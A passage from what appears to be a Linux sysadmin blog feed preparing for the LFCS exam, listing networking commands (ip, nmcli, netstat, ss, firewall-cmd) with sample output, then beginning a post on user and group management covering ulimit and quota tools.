<blockquote><p>configure a network interface</p></blockquote>

<ul>
<li><p>ifconfig <interface> up / down &ndash; activate / deactivate interface</p></li>
<li><p>ifconfig <interface> promisc &ndash; enable / disable promiscuous mode</p></li>
<li>ifconfig <interface> netmask addr &ndash; set network mask</li>
<li>ifconfig <interface> address &ndash; assign IP to interface</li>
</ul>


<h4>ip</h4>

<blockquote><p>show / manipulate routing, devices, policy routing and tunnels</p></blockquote>

<ul>
<li>show information about all interfaces</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip a
</span><span class='line'>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1
</span><span class='line'>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span><span class='line'>    inet 127.0.0.1/8 scope host lo
</span><span class='line'>       valid_lft forever preferred_lft forever
</span><span class='line'>    inet6 ::1/128 scope host
</span><span class='line'>       valid_lft forever preferred_lft forever
</span><span class='line'>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000
</span><span class='line'>    link/ether 00:0c:29:47:d7:a8 brd ff:ff:ff:ff:ff:ff
</span><span class='line'>    inet 192.168.241.130/24 brd 192.168.241.255 scope global dynamic enp0s3
</span><span class='line'>       valid_lft 1665sec preferred_lft 1665sec
</span><span class='line'>    inet6 fe80::d7e8:7b48:831f:a1de/64 scope link
</span><span class='line'>       valid_lft forever preferred_lft forever
</span><span class='line'>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN qlen 1000
</span><span class='line'>    link/ether 52:54:00:e8:ed:ae brd ff:ff:ff:ff:ff:ff
</span><span class='line'>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
</span><span class='line'>       valid_lft forever preferred_lft forever
</span><span class='line'>4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN qlen 1000
</span><span class='line'>    link/ether 52:54:00:e8:ed:ae brd ff:ff:ff:ff:ff:ff</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show routing table</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip r
</span><span class='line'>default via 192.168.241.2 dev enp0s3  proto static  metric 100
</span><span class='line'>192.168.122.0/24 dev virbr0  proto kernel  scope link  src 192.168.122.1
</span><span class='line'>192.168.241.0/24 dev enp0s3  proto kernel  scope link  src 192.168.241.130  metric 100</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show network interface statistics</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip -s link show enp0s3
</span><span class='line'>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT qlen 1000
</span><span class='line'>    link/ether 00:0c:29:47:d7:a8 brd ff:ff:ff:ff:ff:ff
</span><span class='line'>    RX: bytes  packets  errors  dropped overrun mcast   
</span><span class='line'>    26927      137      0       0       0       0       
</span><span class='line'>    TX: bytes  packets  errors  dropped carrier collsns
</span><span class='line'>    112697     201      0       0       0       0       </span></code></pre></td></tr></table></div></figure>


<h4>hostnamectl</h4>

<blockquote><p>Control the system hostname</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hostnamectl
</span><span class='line'>   Static hostname: tron
</span><span class='line'>         Icon name: computer-vm
</span><span class='line'>           Chassis: vm
</span><span class='line'>        Machine ID: bae5d656813c4d17a18bc5ac0a89cfc2
</span><span class='line'>           Boot ID: b0bbeef032cf4f6b9f4f764f9a043cb5
</span><span class='line'>    Virtualization: vmware
</span><span class='line'>  Operating System: Red Hat Enterprise Linux
</span><span class='line'>       CPE OS Name: cpe:/o:redhat:enterprise_linux:7.3:GA:server
</span><span class='line'>            Kernel: Linux 3.10.0-514.26.2.el7.x86_64
</span><span class='line'>      Architecture: x86-64</span></code></pre></td></tr></table></div></figure>


<p>To make hostname changes permanent, modify the content of <strong>/etc/hostname</strong>. You can set it with <strong>hostnamectl set-hostname name</strong></p>

<h4>nmcli</h4>

<blockquote><p>command-line tool for controlling NetworkManager</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli -p
</span><span class='line'>virbr0: connected to virbr0
</span><span class='line'>  bridge, 52:54:00:E8:ED:AE, sw, mtu 1500
</span><span class='line'>  inet4 192.168.122.1/24
</span><span class='line'>
</span><span class='line'>enp0s3: connected to Wired connection 1
</span><span class='line'>  "Intel 82545EM Gigabit Ethernet Controller (Copper) (PRO/1000 MT Single Port Adapter)"
</span><span class='line'>  ethernet (e1000), 00:0C:29:47:D7:A8, hw, mtu 1500
</span><span class='line'>  ip4 default
</span><span class='line'>  inet4 192.168.241.130/24
</span><span class='line'>  inet6 fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>
</span><span class='line'>lo: unmanaged
</span><span class='line'>  loopback (unknown), 00:00:00:00:00:00, sw, mtu 65536
</span><span class='line'>
</span><span class='line'>virbr0-nic: unmanaged
</span><span class='line'>  tun, 52:54:00:E8:ED:AE, sw, mtu 1500</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show information about interface</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli -p connection show enp0s3
</span><span class='line'>===============================================================================
</span><span class='line'>                      Connection profile details (enp0s3)
</span><span class='line'>===============================================================================
</span><span class='line'>connection.id:                          enp0s3
</span><span class='line'>connection.uuid:                        b4c32cc7-c5ff-451c-8af2-9b9124050f99
</span><span class='line'>connection.stable-id:                   --
</span><span class='line'>connection.interface-name:              enp0s3
</span><span class='line'>connection.type:                        802-3-ethernet
</span><span class='line'>connection.autoconnect:                 yes
</span><span class='line'>connection.autoconnect-priority:        0
</span><span class='line'>connection.timestamp:                   1499955175
</span><span class='line'>connection.read-only:                   no
</span><span class='line'>connection.permissions:                 
</span><span class='line'>connection.zone:                        --
</span><span class='line'>connection.master:                      --
</span><span class='line'>connection.slave-type:                  --
</span><span class='line'>connection.autoconnect-slaves:          -1 (default)
</span><span class='line'>connection.secondaries:                 
</span><span class='line'>connection.gateway-ping-timeout:        0
</span><span class='line'>connection.metered:                     unknown
</span><span class='line'>connection.lldp:                        -1 (default)
</span><span class='line'>-------------------------------------------------------------------------------
</span><span class='line'>802-3-ethernet.port:                    --
</span><span class='line'>802-3-ethernet.speed:                   0
</span><span class='line'>802-3-ethernet.duplex:                  --
</span><span class='line'>802-3-ethernet.auto-negotiate:          yes
</span><span class='line'>802-3-ethernet.mac-address:             00:0C:29:47:D7:A8
</span><span class='line'>802-3-ethernet.cloned-mac-address:      --
</span><span class='line'>802-3-ethernet.generate-mac-address-mask:--
</span><span class='line'>802-3-ethernet.mac-address-blacklist:   
</span><span class='line'>802-3-ethernet.mtu:                     auto
</span><span class='line'>802-3-ethernet.s390-subchannels:        
</span><span class='line'>802-3-ethernet.s390-nettype:            --
</span><span class='line'>802-3-ethernet.s390-options:            
</span><span class='line'>802-3-ethernet.wake-on-lan:             1 (default)
</span><span class='line'>802-3-ethernet.wake-on-lan-password:    --
</span><span class='line'>-------------------------------------------------------------------------------
</span><span class='line'>ipv4.method:                            auto
</span><span class='line'>ipv4.dns:                               
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>ipv4.addresses:                         
</span><span class='line'>ipv4.gateway:                           --
</span><span class='line'>ipv4.routes:                            
</span><span class='line'>ipv4.route-metric:                      -1
</span><span class='line'>ipv4.ignore-auto-routes:                no
</span><span class='line'>ipv4.ignore-auto-dns:                   no
</span><span class='line'>ipv4.dhcp-client-id:                    --
</span><span class='line'>ipv4.dhcp-timeout:                      0
</span><span class='line'>ipv4.dhcp-send-hostname:                yes
</span><span class='line'>ipv4.dhcp-hostname:                     --
</span><span class='line'>ipv4.dhcp-fqdn:                         --
</span><span class='line'>ipv4.never-default:                     no
</span><span class='line'>ipv4.may-fail:                          yes
</span><span class='line'>ipv4.dad-timeout:                       -1 (default)
</span><span class='line'>-------------------------------------------------------------------------------
</span><span class='line'>ipv6.method:                            auto
</span><span class='line'>ipv6.dns:                               
</span><span class='line'>ipv6.dns-search:                        
</span><span class='line'>ipv6.dns-options:                       (default)
</span><span class='line'>ipv6.dns-priority:                      0
</span><span class='line'>ipv6.addresses:                         
</span><span class='line'>ipv6.gateway:                           --
</span><span class='line'>ipv6.routes:                            
</span><span class='line'>ipv6.route-metric:                      -1
</span><span class='line'>ipv6.ignore-auto-routes:                no
</span><span class='line'>ipv6.ignore-auto-dns:                   no
</span><span class='line'>ipv6.never-default:                     no
</span><span class='line'>ipv6.may-fail:                          yes
</span><span class='line'>ipv6.ip6-privacy:                       0 (disabled)
</span><span class='line'>ipv6.addr-gen-mode:                     stable-privacy
</span><span class='line'>ipv6.dhcp-send-hostname:                yes
</span><span class='line'>ipv6.dhcp-hostname:                     --
</span><span class='line'>ipv6.token:                             --
</span><span class='line'>-------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<h4>route</h4>

<blockquote><p>show / manipulate the IP routing table</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>route -n
</span><span class='line'>Kernel IP routing table
</span><span class='line'>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
</span><span class='line'>0.0.0.0         192.168.241.2   0.0.0.0         UG    100    0        0 enp0s3
</span><span class='line'>192.168.122.0   0.0.0.0         255.255.255.0   U     0      0        0 virbr0
</span><span class='line'>192.168.241.0   0.0.0.0         255.255.255.0   U     100    0        0 enp0s3</span></code></pre></td></tr></table></div></figure>


<h4>firewall-cmd</h4>

<blockquote><p>firewalld command line client</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>


<ul>
<li>enumerate predefined zones</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-zones
</span><span class='line'>work drop internal external trusted home dmz public block</span></code></pre></td></tr></table></div></figure>


<h4>tracepath,  tracepath6</h4>

<blockquote><p>traces path to a network host discovering MTU along this path</p></blockquote>

<h4>netstat</h4>

<blockquote><p> Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships</p></blockquote>

<ul>
<li>show listening TCP ports in numbers</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnt
</span><span class='line'>Active Internet connections (only servers)
</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
</span><span class='line'>tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
</span><span class='line'>tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN     
</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
</span><span class='line'>tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
</span><span class='line'>tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
</span><span class='line'>tcp6       0      0 :::111                  :::*                    LISTEN     
</span><span class='line'>tcp6       0      0 :::22                   :::*                    LISTEN     
</span><span class='line'>tcp6       0      0 ::1:631                 :::*                    LISTEN     
</span><span class='line'>tcp6       0      0 ::1:25                  :::*                    LISTEN  </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list interfaces</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -i
</span><span class='line'>'Kernel Interface table
</span><span class='line'>Iface      MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
</span><span class='line'>enp0s3    1500      139      0      0 0           203      0      0      0 BMRU
</span><span class='line'>lo       65536       68      0      0 0            68      0      0      0 LRU
</span><span class='line'>virbr0    1500        0      0      0 0             0      0      0      0 BMU</span></code></pre></td></tr></table></div></figure>


<ul>
<li>statistics</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -s
</span><span class='line'>Ip:
</span><span class='line'>    190 total packets received
</span><span class='line'>    0 forwarded
</span><span class='line'>    0 incoming packets discarded
</span><span class='line'>    180 incoming packets delivered
</span><span class='line'>    216 requests sent out
</span><span class='line'>    65 dropped because of missing route
</span><span class='line'>Icmp:
</span><span class='line'>    3 ICMP messages received
</span><span class='line'>    0 input ICMP message failed.
</span><span class='line'>    ICMP input histogram:
</span><span class='line'>        timeout in transit: 2
</span><span class='line'>        echo requests: 1
</span><span class='line'>    1 ICMP messages sent
</span><span class='line'>    0 ICMP messages failed
</span><span class='line'>    ICMP output histogram:
</span><span class='line'>        echo replies: 1
</span><span class='line'>IcmpMsg:
</span><span class='line'>        InType8: 1
</span><span class='line'>        InType11: 2
</span><span class='line'>        OutType0: 1
</span><span class='line'>Tcp:
</span><span class='line'>    34 active connections openings
</span><span class='line'>    0 passive connection openings
</span><span class='line'>    34 failed connection attempts
</span><span class='line'>    0 connection resets received
</span><span class='line'>    0 connections established
</span><span class='line'>    68 segments received
</span><span class='line'>    68 segments send out
</span><span class='line'>    0 segments retransmited
</span><span class='line'>    0 bad segments received.
</span><span class='line'>    34 resets sent
</span><span class='line'>Udp:
</span><span class='line'>    104 packets received
</span><span class='line'>    0 packets to unknown port received.
</span><span class='line'>    0 packet receive errors
</span><span class='line'>    143 packets sent
</span><span class='line'>    0 receive buffer errors
</span><span class='line'>    0 send buffer errors
</span><span class='line'>UdpLite:
</span><span class='line'>TcpExt:
</span><span class='line'>    0 packet headers predicted
</span><span class='line'>IpExt:
</span><span class='line'>    InNoRoutes: 3
</span><span class='line'>    InMcastPkts: 18
</span><span class='line'>    OutMcastPkts: 26
</span><span class='line'>    InBcastPkts: 12
</span><span class='line'>    InOctets: 31730
</span><span class='line'>    OutOctets: 105262
</span><span class='line'>    InMcastOctets: 4252
</span><span class='line'>    OutMcastOctets: 5054
</span><span class='line'>    InBcastOctets: 4212
</span><span class='line'>    InNoECTPkts: 190</span></code></pre></td></tr></table></div></figure>


<h4>ss</h4>

<blockquote><p>another utility to investigate sockets</p></blockquote>

<ul>
<li>show statistics</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ss -s
</span><span class='line'>Total: 1114 (kernel 1133)
</span><span class='line'>TCP:   0 (estab 0, closed 0, orphaned 0, synrecv 0, timewait 0/0), ports 0
</span><span class='line'>
</span><span class='line'>Transport Total     IP        IPv6
</span><span class='line'>*   1133      -         -        
</span><span class='line'>RAW     1         0         1        
</span><span class='line'>UDP     1         1         0        
</span><span class='line'>TCP     0         0         0        
</span><span class='line'>INET    2         1         1        
</span><span class='line'>FRAG    0         0         0        </span></code></pre></td></tr></table></div></figure>


<ul>
<li>show all TCP sockets</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ss -t -a
</span><span class='line'>State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port                
</span><span class='line'>ESTAB      0      0      192.168.217.132:40382                87.243.6.137:http</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Q: Why did the programmer call his    \
</span><span class='line'>| mother long distance? A: Because that |
</span><span class='line'>\ was her name.                         /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - User and group management]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/28/lfcs-prep-user-and-group-management/"/>
    <updated>2018-02-28T13:26:56-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/28/lfcs-prep-user-and-group-management</id>
    <content type="html"><![CDATA[<p>Various commands for the LFCS User and Group Management domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>

<!-- more -->


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/users.png" title="user cmds" alt="user and group cmds"></p>

<h4>ulimit</h4>

<blockquote><p>Provides control over the resources available  to the shell and to processes started by it, on systems that allow such control</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>help ulimit
</span><span class='line'>ulimit: ulimit [-SHacdefilmnpqrstuvx] [limit]
</span><span class='line'>    Modify shell resource limits.
</span><span class='line'>
</span><span class='line'>    Provides control over the resources available to the shell and processes
</span><span class='line'>    it creates, on systems that allow such control.
</span><span class='line'>
</span><span class='line'>    Options:
</span><span class='line'>      -S  use the `soft' resource limit
</span><span class='line'>      -H  use the `hard' resource limit
</span><span class='line'>      -a  all current limits are reported
</span><span class='line'>      -b  the socket buffer size
</span><span class='line'>      -c  the maximum size of core files created
</span><span class='line'>      -d  the maximum size of a process's data segment
</span><span class='line'>      -e  the maximum scheduling priority (`nice')
</span><span class='line'>      -f  the maximum size of files written by the shell and its children
</span><span class='line'>      -i  the maximum number of pending signals
</span><span class='line'>      -l  the maximum size a process may lock into memory
</span><span class='line'>      -m  the maximum resident set size
</span><span class='line'>      -n  the maximum number of open file descriptors
</span><span class='line'>      -p  the pipe buffer size
</span><span class='line'>      -q  the maximum number of bytes in POSIX message queues
</span><span class='line'>      -r  the maximum real-time scheduling priority
</span><span class='line'>      -s  the maximum stack size
</span><span class='line'>      -t  the maximum amount of cpu time in seconds
</span><span class='line'>      -u  the maximum number of user processes
</span><span class='line'>      -v  the size of virtual memory
</span><span class='line'>      -x  the maximum number of file locks
</span><span class='line'>
</span><span class='line'>    If LIMIT is given, it is the new value of the specified resource; the
</span><span class='line'>    special LIMIT values `soft', `hard', and `unlimited' stand for the
</span><span class='line'>    current soft limit, the current hard limit, and no limit, respectively.
</span><span class='line'>    Otherwise, the current value of the specified resource is printed.  If
</span><span class='line'>    no option is given, then -f is assumed.
</span><span class='line'>
</span><span class='line'>    Values are in 1024-byte increments, except for -t, which is in seconds,
</span><span class='line'>    -p, which is in increments of 512 bytes, and -u, which is an unscaled
</span><span class='line'>    number of processes.
</span><span class='line'>
</span><span class='line'>    Exit Status:
</span><span class='line'>    Returns success unless an invalid option is supplied or an error occurs.</span></code></pre></td></tr></table></div></figure>


<p>Config file in <strong>/etc/security/limits.conf</strong></p>

<ul>
<li>list current limits</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ulimit -a
</span><span class='line'>core file size          (blocks, -c) 0
</span><span class='line'>data seg size           (kbytes, -d) unlimited
</span><span class='line'>scheduling priority             (-e) 0
</span><span class='line'>file size               (blocks, -f) unlimited
</span><span class='line'>pending signals                 (-i) 7238
</span><span class='line'>max locked memory       (kbytes, -l) 64
</span><span class='line'>max memory size         (kbytes, -m) unlimited
</span><span class='line'>open files                      (-n) 1024
</span><span class='line'>pipe size            (512 bytes, -p) 8
</span><span class='line'>POSIX message queues     (bytes, -q) 819200
</span><span class='line'>real-time priority              (-r) 0
</span><span class='line'>stack size              (kbytes, -s) 8192
</span><span class='line'>cpu time               (seconds, -t) unlimited
</span><span class='line'>max user processes              (-u) 7238
</span><span class='line'>virtual memory          (kbytes, -v) unlimited
</span><span class='line'>file locks                      (-x) unlimited</span></code></pre></td></tr></table></div></figure>


<h4>quotacheck</h4>

<blockquote><p>scan a filesystem for disk usage, create, check and repair quota files</p></blockquote>

<h4>quotaon, quotaoff</h4>

<blockquote><p>turn filesystem quotas on and off</p></blockquote>

<h4>repquota</h4>

<blockquote><p>summarize quotas for a filesystem</p></blockquote>

<h4>setquota</h4>

<blockquote><p>set disk quotas</p></blockquote>

<h4>edquota</h4>

<blockquote><p>edit user quotas</p></blockquote>

<h4>pwscore</h4>

<blockquote><p>simple configurable tool for checking quality of a password</p>

<p>password is read from stdin</p>

<p>It either reports an error if the password fails any of the checks,  or it  prints out the password quality score as an integer value between 0 and 100.</p></blockquote>

<h4>getent</h4>

<blockquote><p>get entries from Name Service Switch libraries</p></blockquote>

<ul>
<li>enumerate networks</li>
</ul>
